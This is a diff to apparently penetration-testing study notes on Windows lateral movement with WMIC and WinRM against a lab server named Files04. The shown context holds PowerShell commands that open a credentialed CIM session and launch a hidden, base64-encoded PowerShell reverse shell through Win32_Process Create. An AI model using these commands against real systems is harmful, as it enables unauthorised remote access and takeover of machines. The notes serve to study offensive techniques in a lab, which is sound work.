@@ -2,6 +2,8 @@
 
 ### WMIC & WinRM
 
+WMI is great for creating processes on a remote windows machine using either a password or hash. The authentication must be part of the Local Administrators. It uses port 135 for remote procedure calls.
+
 We'll instruct wmic to launch a calculator, "calc" instance with the process call create keywords. It is important to note, that the machine we are attacking is a server with the hostname Files04. We are attemping to move laterally from our current machine, to this new server.
 
 We can test the command by connecting as jeff on CLIENT74.
@@ -103,7 +105,7 @@ PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
 PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
 
 PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
-HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'; # Powershell encoded reverse shell
 
 PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
 
